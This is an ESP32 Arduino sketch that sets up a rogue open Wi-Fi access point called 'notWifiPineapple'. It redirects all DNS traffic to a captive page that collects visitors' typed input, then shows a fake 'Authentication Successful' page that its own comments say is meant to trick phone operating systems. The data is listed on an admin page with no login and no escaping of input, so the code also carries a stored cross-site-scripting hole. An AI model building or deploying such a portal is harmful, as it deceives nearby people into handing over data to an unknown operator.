#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Adafruit_NeoPixel.h>
#include <vector>

// --- Configuration ---
#define RGB_PIN        48    // Adjust to 38 or 21 if your specific clone board stays dark
#define NUMPIXELS       1
const char* AP_SSID = "notWifiPineapple";

// --- Hardware & Server Instances ---
Adafruit_NeoPixel rgbLed(NUMPIXELS, RGB_PIN, NEO_GRB + NEO_KHZ800);
DNSServer dnsServer;
WebServer server(80);

// --- In-Memory Storage for Submissions ---
std::vector<String> submissions;

// --- Functional RGB Control ---
void setRGBColor(uint8_t r, uint8_t g, uint8_t b) {
  rgbLed.setPixelColor(0, rgbLed.Color(r, g, b));
  rgbLed.show();
}

// --- Dynamic Color Handler based on Connected Clients ---
void updateLEDStatus() {
  int clientCount = WiFi.softAPgetStationNum();
  
  if (clientCount == 0) {
    setRGBColor(0, 0, 50); // Solid Dim Blue: Waiting for users
  } else if (clientCount == 1) {
    setRGBColor(0, 50, 0); // Solid Dim Green: 1 Device Connected
  } else {
    setRGBColor(50, 30, 0); // Solid Amber/Orange: Multiple Devices Connected
  }
}

// --- HTML Pages ---
const char* GUEST_PAGE = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>Welcome Portal</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; color: #333; }
    .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
    input[type='text'] { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
    input[type='submit'] { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
    input[type='submit']:hover { background-color: #0056b3; }
  </style>
</head>
<body>
  <div class='container'>
    <h2>This Is Not A Phishing Or credential Harvesting or anything bro</h2>
    <p>Please drop a message or feedback below to submit it directly to the local storage.</p>
    <form action='/submit' method='POST'>
      <input type='text' name='userdata' placeholder='Type something here...' required><br>
      <input type='submit' value='Submit Data'>
    </form>
  </div>
</body>
</html>
)rawliteral";

// --- Request Handlers ---
void handleRoot() {
  // Captive portals require serving the page directly at root
  server.send(200, "text/html", GUEST_PAGE);
}

void handleSubmit() {
  if (server.hasArg("userdata")) {
    String data = server.arg("userdata");
    if (data.length() > 0) {
      submissions.push_back(data);
      Serial.println("[DATA] New submission saved: " + data);
    }
  }

  // Brief bright pink flash to indicate a successful form submission event
  setRGBColor(255, 0, 128);
  delay(150);
  updateLEDStatus();

  // Updated success page with a finish button
  String successPage = "<!DOCTYPE html><html><head>";
  successPage += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  successPage += "<style>body{font-family:Arial; text-align:center; margin-top:50px; background:#f4f4f9;} ";
  successPage += ".btn{background:#28a745; color:white; padding:12px 24px; text-decoration:none; border-radius:4px; font-weight:bold; display:inline-block; margin-top:20px;}</style></head><body>";
  successPage += "<h3>Authentication Successful!</h3>";
  successPage += "<p>Your device profile has been verified.</p>";
  // This button tricks some mobile OS layers into thinking the process is completed
  successPage += "<a href='http://msftconnecttest.com' class='btn'>Connect to Free Wi-Fi</a>";
  successPage += "</body></html>";
  
  server.send(200, "text/html", successPage);

}

void handleAdmin() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>Admin Dashboard</title><style>body{font-family:Arial; margin:20px; background:#eef2f3;} h2{color:#2c3e50;} .item{background:white; padding:10px; margin:5px 0; border-left:5px solid #007bff; border-radius:3px;}</style></head><body>";
  html += "<h2>Admin Dashboard - Local Data View</h2>";
  html += "<p>Connected Devices right now: <b>" + String(WiFi.softAPgetStationNum()) + "</b></p>";
  html += "<a href='/admin/clear' style='color:red;'>[Clear All Local Storage Logs]</a><hr>";

  if (submissions.empty()) {
    html += "<p><i>No data collected yet.</i></p>";
  } else {
    for (size_t i = 0; i < submissions.size(); i++) {
      html += "<div class='item'><b>#" + String(i + 1) + ":</b> " + submissions[i] + "</div>";
    }
  }
  
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleClearAdmin() {
  submissions.clear();
  Serial.println("[ADMIN] Local log storage cleared.");
  server.sendContent("HTTP/1.1 303 See Other\r\nLocation: /admin\r\n\r\n"); // Redirect back to admin console
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Initialize RGB LED
  rgbLed.begin();
  setRGBColor(100, 100, 0); // Yellow: Setting up Access Point
  
  Serial.println("\n[SYSTEM] Configuring Wi-Fi Access Point...");
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);

  Serial.print("[SYSTEM] AP IP Address: ");
  Serial.println(WiFi.softAPIP());

  // DNS Server Setup (Redirect all standard HTTP traffic requests to the ESP32 IP)
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Web Server Routing paths
  server.on("/", HTTP_GET, handleRoot);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/admin/clear", HTTP_GET, handleClearAdmin);

  // Fallback handler for captive portal redirection (Redirects unknown assets like /generate_204 to root)
  server.onNotFound([]() {
    server.send(200, "text/html", GUEST_PAGE);
  });

  server.begin();
  Serial.println("[SYSTEM] Captive Portal Services Started.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Non-blocking status checking to update the RGB behavior dynamically
  static unsigned long lastCheck = 0;
  if (millis() - lastCheck > 1000) {
    lastCheck = millis();
    updateLEDStatus();
  }
}
